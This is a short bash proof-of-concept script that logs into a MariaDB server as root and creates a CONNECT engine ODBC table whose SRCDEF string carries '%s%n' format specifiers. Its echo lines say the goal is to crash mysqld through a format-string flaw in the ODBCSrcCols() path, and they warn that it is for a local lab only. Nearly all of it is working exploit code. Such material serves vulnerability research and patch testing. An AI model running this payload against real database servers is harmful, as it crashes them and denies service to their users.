#!/bin/bash
set -euo pipefail

echo "[crash] attempting isolated crash trigger using %n in ODBCSrcCols() path"
echo "[crash] run only in local lab. this may stop mysqld container."
echo "[crash] payload includes %s so sprintf(...) path is entered before SQL reaches SQLite"

mariadb -h db -uroot -prootpw test <<'SQL'
DROP TABLE IF EXISTS odbc_fmt_crash;

CREATE TABLE odbc_fmt_crash
ENGINE=CONNECT
TABLE_TYPE=ODBC
CONNECTION='DSN=pocsqlite;'
SRCDEF='SELECT 1 AS marker WHERE %s%n';
SQL

echo "[crash] query returned. if db crashed, this line may not run."
